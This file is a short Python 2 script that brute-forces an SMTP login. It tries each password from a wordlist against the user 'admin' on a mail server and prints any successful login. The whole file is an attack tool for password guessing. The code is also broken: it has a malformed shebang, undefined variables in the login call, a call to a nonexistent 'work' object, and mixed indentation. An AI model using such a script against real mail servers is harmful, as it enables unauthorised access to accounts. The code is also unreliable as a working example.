#!usr/bin/python

import sys, smtplib, socket
from smtplib import SMTP

IP = "127.0.0.1"
USER = "admin"

attackNumber = 1
with open('passwordlist.txt') as f:
    for PASSWORD in f:
		try:
			print "-"*12
			print "User:",USER,"Password:",PASSWORD
			smtp = smtplib.SMTP(IP)
			smtp.login(user, value)
			print "\t\nLogin successful:",user, value
			smtp.quit()
			work.join()
			sys.exit(2)
		except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
			print "An error occurred:", msg


